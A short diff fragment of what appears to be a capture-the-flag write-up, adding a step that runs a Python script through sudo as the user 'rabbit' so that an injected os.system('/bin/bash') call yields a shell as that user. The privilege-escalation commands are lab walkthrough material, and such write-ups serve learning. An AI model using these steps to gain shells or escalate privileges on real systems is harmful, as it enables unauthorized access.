@@ -109,5 +109,14 @@ import os
 os.system("/bin/bash")
 ```
 
+now make run to the file /home/alice/walrus_and_the_carpenter.py
+
+```bash
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
+
+have a shell with as rabbit user but this is also low permision
+continue
+
 
 ---
